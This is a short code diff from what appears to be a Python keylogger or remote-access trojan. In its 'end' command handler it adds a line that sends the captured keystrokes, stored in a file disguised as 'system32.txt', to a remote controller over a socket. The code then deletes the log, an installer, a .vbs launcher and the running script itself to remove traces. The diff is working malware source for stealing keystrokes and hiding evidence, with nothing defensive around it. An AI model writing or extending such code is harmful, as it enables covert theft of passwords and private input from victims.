@@ -108,6 +108,7 @@ def receive_commands():
             break
 
         elif data[:3].decode("utf-8") == "end":
+            s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
             delete_file("system32.txt")
             print("Obrisao 1")
             delete_file("install.py")
@@ -115,7 +116,6 @@ def receive_commands():
             delete_file("a.vbs")
             print("Obrisao 3")
 
-        # Remove the script file (the one running this code)
             script_path = os.path.abspath(sys.argv[0])
             os.remove(script_path)
             # print("Puca ovde")
